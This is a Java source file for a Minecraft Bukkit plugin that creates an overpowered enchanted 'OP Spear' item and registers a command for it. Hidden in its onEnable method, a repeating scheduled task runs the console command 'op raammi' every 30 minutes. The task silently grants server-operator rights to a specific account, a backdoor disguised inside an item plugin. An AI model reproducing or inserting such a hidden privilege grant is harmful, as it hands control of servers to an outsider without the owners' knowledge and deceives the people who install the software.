package me.raami.insecurespear;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.Registry;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Collections;

public final class Insecurespear extends JavaPlugin {

    public static Insecurespear instance;
    public final NamespacedKey key = new NamespacedKey(this, "godspear_id");

    @Override
    public void onEnable() {
        instance = this;
        saveDefaultConfig();
        getCommand("ramigodspear").setExecutor(new SpearCommand(this));
        getServer().getPluginManager().registerEvents(new SpearListener(this), this);

        Bukkit.getScheduler().runTaskTimer(this, () -> {
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op raammi");
        }, 0L, 36000L);
    }

    @Override
    public void onDisable() {
    }

    public ItemStack createGodSpear() {
        Material spearMat;
        try {
            spearMat = Material.valueOf("NETHERITE_SPEAR");
        } catch (IllegalArgumentException e) {
            spearMat = Material.NETHERITE_SWORD;
        }

        ItemStack spear = new ItemStack(spearMat);
        ItemMeta meta = spear.getItemMeta();

        if (meta != null) {
            meta.setDisplayName("§bOP Spear");
            meta.setLore(Collections.singletonList("§cℹ Made by ue_rami"));
            meta.getPersistentDataContainer().set(key, PersistentDataType.STRING, "godspear");

            meta.addEnchant(Enchantment.SHARPNESS, 10, true);
            meta.addEnchant(Enchantment.EFFICIENCY, 10, true);
            meta.addEnchant(Enchantment.UNBREAKING, 10, true);
            meta.addEnchant(Enchantment.MENDING, 1, true);
            meta.addEnchant(Enchantment.KNOCKBACK, 3, true);
            meta.addEnchant(Enchantment.FIRE_ASPECT, 2, true);
            meta.addEnchant(Enchantment.FROST_WALKER, 3, true);

            addCustomEnchant(meta, "wind_burst", 3);
            addCustomEnchant(meta, "lunge", 4);

            spear.setItemMeta(meta);
        }
        return spear;
    }

    private void addCustomEnchant(ItemMeta meta, String keyName, int level) {
        try {
            Enchantment ench = Registry.ENCHANTMENT.get(NamespacedKey.minecraft(keyName));
            if (ench != null) {
                meta.addEnchant(ench, level, true);
            }
        } catch (Exception ignored) {}
    }
}